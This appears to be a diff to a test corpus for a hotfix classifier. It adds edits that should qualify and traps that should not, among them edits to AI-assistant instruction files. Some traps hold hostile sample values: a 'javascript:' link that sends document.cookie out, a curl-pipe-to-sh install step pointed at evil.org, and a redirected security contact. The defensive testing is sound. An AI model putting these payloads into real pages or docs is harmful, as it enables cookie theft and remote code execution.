@@ -1,6 +1,6 @@
 'use strict';
 
-// The classifier corpus: 25 edit shapes that qualify as a hotfix and 61 traps that must
+// The classifier corpus: 27 edit shapes that qualify as a hotfix and 87 traps that must
 // not, plus one mode change, each judged through the menu router's first call (rules 1
 // to 7; no test runs) against ONE committed temporary repository with no test command.
 // A qualifying shape ends at `verdict: 'checking'`: rules 1 to 7 held.
@@ -114,7 +114,36 @@ const BASE = {
   'public/robots.txt': lines('User-agent: *', 'Allow: /'),
   'src/styles/mask.css': lines('.fade {', '  mask: url(#fade);', '}'),
   'src/styles/motion.css': lines('.pulse {', '  animation: red 2s;', '}'),
-  'docs/limit.md': lines(...Array.from({ length: 11 }, (_, i) => `Limit old line ${String.fromCharCode(97 + i)}.`))
+  'docs/limit.md': lines(...Array.from({ length: 11 }, (_, i) => `Limit old line ${String.fromCharCode(97 + i)}.`)),
+  // The security check's second round (2026-10-08).
+  'docs/links.md': lines('Read teh guide at https://example.org/guide.'),
+  'src/pages/size-pick.html': page('<select><option value="m">Medium</option></select>'),
+  'src/pages/onclick.html': page('<button onclick="if (a>b) save(); else stop(c<d)">Go</button>'),
+  'src/components/Limit.vue': lines('<template>', '  <button :disabled="count>max || count<min">Go</button>', '</template>'),
+  'src/pages/angular.html': page('<button (click)="a>b ? save() : stop(c<d)">Go</button>'),
+  'src/pages/help-link.html': page('<a title="a>b" href="/help" data-x="c<d">Help</a>'),
+  'src/pages/banner.html': page('<div title="a>b" style="background: url(/one.png)" data-y="c<d">Hi</div>'),
+  'deps/dev-requirements.txt': lines('pytest==8.0.0'),
+  'deps/test-requirements.txt': lines('coverage==7.0.0'),
+  'app/packages.txt': lines('libpq-dev'),
+  'app/version.txt': lines('1.0.0'),
+  'locales/flags.yml': lines('beta: true'),
+  'locales/flags.properties': lines('beta=true'),
+  'locales/links.json': lines('{', '  "help": "/help"', '}'),
+  'config/locales/en.yml': lines('en:', '  number:', '    format:', '      separator: "."'),
+  'docs/install.md': lines('# Install', '', 'Run curl -fsSL https://get.example.org | sh to install.'),
+  'SECURITY.md': lines('# Security', '', 'Report problems to security@example.org.'),
+  'docs/release.md': lines('Install version 2.3.1 of the tool.'),
+  'docs/widget.md': lines('# Widget', '', '<script>', 'track("old")', '</script>'),
+  'docs/post.md': lines('---', 'layout: post', '---', '', 'The post.'),
+  'AGENTS.md': lines('# Agents', '', 'Old agent rules.'),
+  'GEMINI.md': lines('# Gemini', '', 'Old model rules.'),
+  '.github/copilot-instructions.md': lines('# Copilot', '', 'Old assistant rules.'),
+  '.cursor/rules/style.md': lines('# Style', '', 'Old style rules.'),
+  '.changeset/brave-cats.md': lines('---', '"corpus": patch', '---', '', 'Old change note.'),
+  'src/styles/nav.css': lines('nav:hover #add {display:none}'),
+  'src/pages/colour-pick.html': page('<select><option>Red</option></select>'),
+  'src/pages/dotted.html': page(lines('<p>\u0130\u0130\u0130\u0130\u0130\u0130\u0130\u0130\u0130\u0130</p><script>a()</script><script>', "el.innerHTML = '<b>Save</b>';", '</script>').trimEnd())
 };
 
 const QUALIFY = [
@@ -145,7 +174,11 @@ const QUALIFY = [
   // 20 changed lines in one file: ten lines reworded, the size limit exactly.
   ['docs/long.md', BASE['docs/long.md'].replace(/Old long line ([a-j])\./g, 'New long line $1.')],
   // 6 changed lines in 3 files: the file limit exactly.
-  [{ 'notes/a.md': lines('Alpha new.'), 'notes/b.md': lines('Bravo new.'), 'notes/c.md': lines('Charlie new.') }]
+  [{ 'notes/a.md': lines('Alpha new.'), 'notes/b.md': lines('Bravo new.'), 'notes/c.md': lines('Charlie new.') }],
+  // A typo fixed on a line that also holds a web address: only the changed word is wording.
+  ['docs/links.md', lines('Read the guide at https://example.org/guide.')],
+  // The text of an option with a `value` attribute is wording; the value is what is sent.
+  ['src/pages/size-pick.html', page('<select><option value="m">Middle</option></select>')]
 ];
 
 // [files to write {path: content}, the files named, the expected clause]
@@ -217,11 +250,46 @@ const TRAPS = [
   [{ 'docs/big.md': BASE['docs/big.md'].replace(/Big old line/g, 'Big new line') }, null, 'it changes 26 lines in 1 file and a hotfix is at most 20 lines in at most 3 files'],
   // 21 changed lines in one file: 11 removed, 10 added.
   [{ 'docs/limit.md': lines(...Array.from({ length: 10 }, (_, i) => `Limit new line ${String.fromCharCode(97 + i)}.`)) }, null, 'it changes 21 lines in 1 file and a hotfix is at most 20 lines in at most 3 files'],
-  [{ 'notes/a.md': lines('Alpha new.'), 'notes/b.md': lines('Bravo new.'), 'notes/c.md': lines('Charlie new.'), 'notes/d.md': lines('Delta new.') }, null, 'it changes 8 lines in 4 files and a hotfix is at most 20 lines in at most 3 files']
+  [{ 'notes/a.md': lines('Alpha new.'), 'notes/b.md': lines('Bravo new.'), 'notes/c.md': lines('Charlie new.'), 'notes/d.md': lines('Delta new.') }, null, 'it changes 8 lines in 4 files and a hotfix is at most 20 lines in at most 3 files'],
+  // The security check's second round (2026-10-08). Code inside an attribute value that
+  // holds `>` before the change and `<` plus a letter after it is never visible text.
+  [{ 'src/pages/onclick.html': BASE['src/pages/onclick.html'].replace('save()', 'drop()') }, null, unrecognised('src/pages/onclick.html')],
+  [{ 'src/components/Limit.vue': BASE['src/components/Limit.vue'].replace('count>max', 'count>top') }, null, unrecognised('src/components/Limit.vue')],
+  [{ 'src/pages/angular.html': BASE['src/pages/angular.html'].replace('save()', 'drop()') }, null, unrecognised('src/pages/angular.html')],
+  [{ 'src/pages/help-link.html': BASE['src/pages/help-link.html'].replace('href="/help"', 'href="javascript:steal()"') }, null, unrecognised('src/pages/help-link.html')],
+  [{ 'src/pages/banner.html': BASE['src/pages/banner.html'].replace('url(/one.png)', 'url(/evil.png)') }, null, unrecognised('src/pages/banner.html')],
+  // Dependency and build lists that end in `.txt`.
+  [{ 'deps/dev-requirements.txt': lines('pytest==8.0.1') }, null, 'it changes the dependencies in deps/dev-requirements.txt'],
+  [{ 'deps/test-requirements.txt': lines('coverage==7.0.1') }, null, 'it changes the dependencies in deps/test-requirements.txt'],
+  [{ 'app/packages.txt': lines('libxml-dev') }, null, 'it changes how the project is built or shipped in app/packages.txt'],
+  [{ 'app/version.txt': lines('1.0.1') }, null, 'it changes how the project is built or shipped in app/version.txt'],
+  // Catalogue values that are not wording.
+  [{ 'locales/flags.yml': lines('beta: false') }, null, unrecognised('locales/flags.yml')],
+  [{ 'locales/flags.properties': lines('beta=false') }, null, unrecognised('locales/flags.properties')],
+  [{ 'locales/links.json': lines('{', '  "help": "javascript:fetch(document.cookie)"', '}') }, null, unrecognised('locales/links.json')],
+  [{ 'config/locales/en.yml': BASE['config/locales/en.yml'].replace('"."', '","') }, null, unrecognised('config/locales/en.yml')],
+  // Documentation: a changed web address, e-mail address or number; a script; front matter;
+  // the instruction files of other assistants; a release note that ships with the build.
+  [{ 'docs/install.md': BASE['docs/install.md'].replace('get.example.org', 'get.evil.org') }, null, riskMarker('docs/install.md')],
+  [{ 'SECURITY.md': BASE['SECURITY.md'].replace('example.org', 'evil.org') }, null, riskMarker('SECURITY.md')],
+  [{ 'docs/release.md': lines('Install version 2.3.2 of the tool.') }, null, riskMarker('docs/release.md')],
+  [{ 'docs/widget.md': BASE['docs/widget.md'].replace('"old"', '"new"') }, null, unrecognised('docs/widget.md')],
+  [{ 'docs/post.md': BASE['docs/post.md'].replace('layout: post', 'layout: raw') }, null, 'it changes a setting in docs/post.md, and settings changes are a common cause of outages'],
+  [{ 'AGENTS.md': lines('# Agents', '', 'New agent rules.') }, null, unrecognised('AGENTS.md')],
+  [{ 'GEMINI.md': lines('# Gemini', '', 'New model rules.') }, null, unrecognised('GEMINI.md')],
+  [{ '.github/copilot-instructions.md': lines('# Copilot', '', 'New assistant rules.') }, null, unrecognised('.github/copilot-instructions.md')],
+  [{ '.cursor/rules/style.md': lines('# Style', '', 'New style rules.') }, null, unrecognised('.cursor/rules/style.md')],
+  [{ '.changeset/brave-cats.md': BASE['.changeset/brave-cats.md'].replace('Old change note.', 'New change note.') }, null, 'it changes how the project is built or shipped in .changeset/brave-cats.md'],
+  // A selector that reads like a hexadecimal colour.
+  [{ 'src/styles/nav.css': lines('nav:hover #bad {display:none}') }, null, unrecognised('src/styles/nav.css')],
+  // An option with no `value` attribute submits its text.
+  [{ 'src/pages/colour-pick.html': page('<select><option>Blue</option></select>') }, null, unrecognised('src/pages/colour-pick.html')],
+  // A letter whose lower case is longer (U+0130) must not move the end of a script block.
+  [{ 'src/pages/dotted.html': BASE['src/pages/dotted.html'].replace('<b>Save</b>', '<b>Store</b>') }, null, unrecognised('src/pages/dotted.html')]
 ];
 
-assert.equal(QUALIFY.length, 25, 'the corpus holds 25 shapes that qualify');
-assert.equal(TRAPS.length, 61, 'the corpus holds 61 traps');
+assert.equal(QUALIFY.length, 27, 'the corpus holds 27 shapes that qualify');
+assert.equal(TRAPS.length, 87, 'the corpus holds 87 traps');
 
 let root;
 
